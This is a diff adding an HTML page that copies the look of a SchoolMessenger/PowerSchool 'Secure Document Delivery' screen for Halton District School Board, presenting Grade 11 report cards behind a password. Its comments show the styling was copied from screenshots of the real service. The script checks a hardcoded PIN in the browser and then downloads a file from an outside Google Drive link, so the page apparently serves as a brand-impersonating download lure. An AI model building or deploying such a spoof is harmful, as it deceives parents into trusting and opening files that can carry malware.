@@ -1,0 +1,421 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Secure Document Delivery</title>
+
+  <style>
+    :root{
+      --blue:#1aa7d6;
+      --blue-dark:#0c7fb7;
+      --card:#ffffff;
+      --line:#e7e7e7;
+      --text:#2b2b2b;
+      --muted:#6b6b6b;
+      --btn:#3b82c4;        /* close to SchoolMessenger button blue */
+      --btn-hover:#2f73b2;
+      --field:#eaf2ff;
+      --shadow: 0 0 0 1px rgba(0,0,0,.08);
+      --border:#dcdcdc;
+    }
+
+    *{ box-sizing:border-box; }
+    body{
+      margin:0;
+      font-family: Arial, Helvetica, sans-serif;
+      color:var(--text);
+      background:#f3f3f3;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+    }
+
+    /* Top bar like screenshot */
+    .topbar{
+      height:78px;
+      background: linear-gradient(0deg, var(--blue) 0%, var(--blue-dark) 100%);
+      box-shadow: 0 1px 0 rgba(0,0,0,.12);
+      display:flex;
+      align-items:center;
+    }
+    .topbar-inner{
+      width:100%;
+      max-width: 1500px;
+      margin:0 auto;
+      padding:0 28px;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      color:#fff;
+    }
+    .brand-left{
+      font-size: 38px;
+      font-weight: 800;
+      letter-spacing:.2px;
+    }
+    .brand-right{
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing:.2px;
+    }
+
+    .wrap{
+      flex:1;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 58px 18px 85px;
+      width:100%;
+    }
+
+    .card{
+      background:var(--card);
+      border-radius: 6px;
+      border:1px solid var(--border);
+      box-shadow: var(--shadow);
+      padding: 24px 28px 28px;
+    }
+
+    .title{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-size: 30px;
+      font-weight: 800;
+      margin: 2px 0 14px;
+    }
+    .title svg{
+      width: 28px;
+      height: 28px;
+      flex:0 0 auto;
+      fill:#1f1f1f;
+    }
+
+    .hr{
+      height:1px;
+      background:var(--line);
+      margin: 14px 0;
+    }
+
+    /* From/Date/Subject block */
+    .meta{
+      display:grid;
+      grid-template-columns: 150px 1fr;
+      gap: 12px 18px;
+      padding: 16px 0 10px;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+    .meta .k{
+      font-weight:700;
+      text-align:right;
+      color:#222;
+    }
+    .meta .v{
+      color:#2b2b2b;
+      word-break: break-word;
+    }
+
+    /* Document row */
+    .doc{
+      display:grid;
+      grid-template-columns: 150px 1fr;
+      gap: 18px;
+      align-items:center;
+      padding: 16px 0;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+    .doc .k{
+      font-weight:700;
+      text-align:right;
+      color:#222;
+    }
+    .doc .v{
+      font-weight:700;
+      color:#222;
+    }
+
+    /* Hint row with info icon */
+    .hint{
+      max-width: 820px;
+      margin: 18px auto 0;
+      display:flex;
+      gap: 12px;
+      align-items:flex-start;
+      color:#2b2b2b;
+      font-size: 18px;
+      line-height: 1.35;
+    }
+    .hint svg{
+      width: 22px;
+      height: 22px;
+      flex:0 0 auto;
+      margin-top:2px;
+      fill:#1f1f1f;
+    }
+
+    /* Password row */
+    .pw{
+      display:grid;
+      grid-template-columns: 150px 1fr;
+      gap: 18px;
+      align-items:center;
+      padding: 20px 0 0;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+    .pw .k{
+      font-weight:700;
+      text-align:right;
+      color:#222;
+      font-size: 20px;
+    }
+
+    .inputgroup{
+      display:flex;
+      align-items:stretch;
+      width:100%;
+      border:1px solid #cfcfcf;
+      border-radius:4px;
+      overflow:hidden;
+      background: var(--field);
+      height:48px;
+    }
+
+    .iconbox{
+      width:56px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:#f3f3f3;
+      border-right:1px solid #cfcfcf;
+    }
+    .iconbox svg{
+      width:20px;
+      height:20px;
+      fill:#1f1f1f;
+    }
+
+    input[type="password"]{
+      flex:1;
+      border:0;
+      outline:none;
+      padding: 0 14px;
+      font-size: 16px;
+      background:transparent;
+    }
+
+    .downloadbtn{
+      border:0;
+      outline:none;
+      cursor:pointer;
+      width:150px;
+      font-size:18px;
+      color:white;
+      background: var(--btn);
+    }
+    .downloadbtn:hover{ background: var(--btn-hover); }
+
+    /* Error banner like screenshot */
+    .error-banner{
+      display:none;
+      max-width: 820px;
+      margin: 18px auto 0;
+      background: #f6d9db;
+      border: 1px solid #efb8bd;
+      border-radius: 4px;
+      padding: 16px 18px;
+      color:#b33939;
+      font-size: 20px;
+      font-weight: 700;
+      align-items:center;
+      gap: 12px;
+    }
+    .error-banner svg{
+      width: 26px;
+      height: 26px;
+      flex:0 0 auto;
+      fill:#ffffff;
+    }
+    .error-icon{
+      width: 30px;
+      height: 30px;
+      border-radius: 6px;
+      background:#d9534f;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex:0 0 auto;
+    }
+
+    /* Footer like screenshot */
+    .footer{
+      background:#4b4b4b;
+      color:#dcdcdc;
+      font-size:15px;
+      padding:20px 30px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+    }
+    .footer .links{
+      display:flex;
+      align-items:center;
+      gap:10px;
+    }
+    .footer a{
+      color:#5fb0ff;
+      text-decoration:none;
+    }
+    .footer a:hover{ text-decoration:underline; }
+
+    @media (max-width:820px){
+      .brand-left{ font-size: 28px; }
+      .brand-right{ font-size: 16px; }
+      .meta,.doc,.pw{ grid-template-columns: 120px 1fr; }
+      .pw .k{ font-size:18px; }
+      .downloadbtn{ width:130px; font-size:16px; }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div class="topbar-inner">
+      <div class="brand-left">SchoolMessenger</div>
+      <div class="brand-right">Halton District School Board</div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="card">
+      <!-- TITLE -->
+      <div class="title">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 0 1 6 0v3H9z"/>
+        </svg>
+        Secure Document Delivery
+      </div>
+
+      <div class="hr"></div>
+
+      <!-- FROM / DATE / SUBJECT -->
+      <div class="meta">
+        <div class="k">From:</div>
+        <div class="v">ELearning@hdsb.ca</div>
+
+        <div class="k">Date:</div>
+        <div class="v">Feb 9, 2026 4:00 pm</div>
+
+        <div class="k">Subject:</div>
+        <div class="v">Grade 11 Report Cards - Term 2 February 2026</div>
+      </div>
+
+      <div class="hr"></div>
+
+      <!-- DOCUMENT -->
+      <div class="doc">
+        <div class="k">Document:</div>
+        <div class="v">attachment.pdf</div>
+      </div>
+
+      <div class="hr"></div>
+
+      <!-- HINT -->
+      <div class="hint">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 15a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm1-3.5V14h-2v-1.2c0-1.6 2.2-1.9 2.2-3.3 0-.8-.6-1.3-1.4-1.3-.9 0-1.5.5-1.6 1.4H8.2C8.3 7.4 9.6 6 11.9 6c2.1 0 3.4 1.2 3.4 2.9 0 2.6-2.3 2.7-2.3 4.6z"/>
+        </svg>
+        <div>Please enter the password provided by your student's school or district to download the secure document.</div>
+      </div>
+
+      <!-- PASSWORD -->
+      <form class="pw" onsubmit="return unlockAndDownload(event)">
+        <div class="k">Password</div>
+
+        <div>
+          <div class="inputgroup">
+            <div class="iconbox" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 0 1 6 0v3H9z"/>
+              </svg>
+            </div>
+
+            <input
+              id="pin"
+              type="password"
+              inputmode="numeric"
+              autocomplete="one-time-code"
+              maxlength="9"
+              aria-label="Password"
+            />
+
+            <button class="downloadbtn" type="submit">Download</button>
+          </div>
+
+          <!-- ERROR BANNER -->
+          <div class="error-banner" id="errorBanner" role="alert" aria-live="polite">
+            <div class="error-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <path d="M11 15h2v2h-2v-2zm0-8h2v6h-2V7zm1-5C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
+              </svg>
+            </div>
+            <div>The password entered was incorrect.</div>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <div>© Copyright 2026 PowerSchool. &nbsp;|&nbsp; All Rights Reserved.</div>
+    <div class="links">
+      <a href="#" onclick="return false;">Privacy Policy</a>
+      <span style="color:#9a9a9a;">|</span>
+      <a href="#" onclick="return false;">Terms of Use</a>
+    </div>
+  </div>
+
+  <script>
+    // ✅ FINAL PIN
+    const correctPin = "661881151";
+
+    // ✅ PDF download link (change this if you upload a new PDF)
+    const pdfUrl = "https://drive.google.com/uc?export=download&id=1kMUK3YAOGHkcZdXk4Nfd5wVz4DQm706w-jU0";
+
+    function unlockAndDownload(e){
+      e.preventDefault();
+
+      const entered = document.getElementById("pin").value.trim();
+      const banner = document.getElementById("errorBanner");
+
+      // Hide banner by default
+      banner.style.display = "none";
+
+      // Must be exactly 9 digits
+      if (!/^\d{9}$/.test(entered)) {
+        banner.style.display = "flex";
+        return false;
+      }
+
+      if (entered !== correctPin) {
+        banner.style.display = "flex";
+        return false;
+      }
+
+      // Start download immediately
+      const a = document.createElement("a");
+      a.href = pdfUrl;
+      a.download = "";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      return false;
+    }
+  </script>
+</body>
+</html>
